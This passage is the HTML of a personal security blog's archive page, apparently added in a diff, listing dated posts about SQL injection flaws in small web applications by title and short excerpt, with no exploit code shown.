+- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
+- Date: 07/01/2022
+- Exploit Au...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
+- Date: 05/01/20222
+- Exploit Author: tw...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
+- Date: 2021-12-30
+- ...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+      
+        
+      
+          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
+          </li>
+        
+      
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+
+</div>
+<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/tryhackme/thm-source/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/tryhackme/thm-source"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
